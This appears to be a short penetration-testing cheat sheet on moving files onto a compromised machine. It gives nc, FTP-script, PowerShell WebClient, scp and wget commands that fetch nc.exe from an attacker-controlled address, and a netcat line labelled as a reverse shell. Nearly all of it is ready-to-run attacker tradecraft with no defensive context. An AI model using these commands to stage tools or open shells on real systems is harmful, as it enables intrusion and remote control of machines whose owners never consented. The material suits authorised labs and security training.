# Transferring Files

### nc
```
nc -nlvp 4444 > income.exe                                      # on server 
nc -nv 192.168.1.1 4444 </usr/share/windows-binaries/wget.exe   # on attacker
```

### ftp
```
# scripted download
echo open 10.x.x.x7> ftp.txt
echo haxor>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt

ftp -s:ftp.txt  # will download nc.exe to current dir
```

### scp
```
scp file.txt root@kali:/tmp/
```

### ps
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.247/nc.exe" >>wget.ps1
echo $file = "nc.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

nc.exe -nv 10.x.x.x 4444  #reverse shell
```

### http
```
http://10.x.x.x/nc.exe
```

### wget
```
wget http://10.x.x.x/nc.exe
```
